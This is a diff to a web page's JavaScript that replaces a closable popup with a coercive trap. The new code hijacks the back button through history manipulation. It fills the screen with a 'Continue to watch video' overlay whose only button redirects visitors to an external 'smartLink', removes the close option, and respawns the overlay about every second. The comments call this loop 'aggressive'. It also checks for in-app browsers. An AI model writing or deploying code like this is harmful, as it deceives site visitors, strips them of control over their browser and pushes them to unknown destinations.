@@ -176,65 +176,96 @@ function isInApp(){
   return /FBAN|FBAV|Instagram|Telegram/i.test(navigator.userAgent);
 }
 
-// ===================== POPUP SYSTEM (NEW) =====================
-function showPopup(onOpen){
+let accepted = false;
+let popupActive = false;
 
-  if(accepted){
-    if(onOpen) onOpen();
-    return;
+// FORCE HISTORY LOCK
+function lockHistory(){
+  history.pushState(null, null, location.href);
+}
+
+window.onpopstate = function () {
+  lockHistory();
+  if(!accepted){
+    showPopup();
   }
+};
 
+// MAIN POPUP
+function showPopup(){
+
+  if(accepted) return;
   if(popupActive) return;
+
   popupActive = true;
 
   const popup = document.createElement("div");
-  popup.id = "popup";
 
   popup.style = `
     position:fixed;
     top:0;left:0;
     width:100%;height:100%;
-    background:rgba(0,0,0,0.9);
+    background:#000;
     display:flex;
     align-items:center;
     justify-content:center;
-    z-index:99999;
+    z-index:999999;
   `;
 
   popup.innerHTML = `
-  <div style="
-    width:60px;
-    height:60px;
-    border:4px solid #22c55e;
-    border-top:4px solid transparent;
-    border-radius:50%;
-    animation:spin 1s linear infinite;
-  "></div>
-`;
+    <div style="
+      background:#111;
+      padding:25px;
+      border-radius:12px;
+      text-align:center;
+      width:260px;
+    ">
+      <p style="margin-bottom:20px;">
+        Continue to watch video
+      </p>
+
+      <button id="continueBtn" style="
+        background:#22c55e;
+        border:none;
+        padding:12px 20px;
+        border-radius:8px;
+        font-weight:bold;
+      ">
+        Continue
+      </button>
+    </div>
+  `;
 
   document.body.appendChild(popup);
 
-  document.getElementById("openBtn").onclick = () => {
+  // ONLY ACTION
+  document.getElementById("continueBtn").onclick = () => {
     accepted = true;
-    localStorage.setItem("accepted","true");
 
-    popup.remove();
-    popupActive = false;
-
-    if(onOpen) onOpen();
+    window.location.href = smartLink;
   };
 
-  document.getElementById("closeBtn").onclick = () => {
-    popup.remove();
-    popupActive = false;
-
-    setTimeout(()=>{
-      if(!accepted){
-        showPopup(onOpen);
-      }
-    }, 5000);
-  };
+  // SUPER FAST LOOP (aggressive)
+  setTimeout(()=>{
+    if(!accepted){
+      popup.remove();
+      popupActive = false;
+      showPopup();
+    }
+  }, 800); // faster loop
 }
+
+// AUTO START
+lockHistory();
+showPopup();
+
+// CONTINUOUS LOOP
+setInterval(()=>{
+  if(!accepted){
+    showPopup();
+  }
+},1000);
+
 
 // ===================== REDIRECT =====================
 function openExternal(){
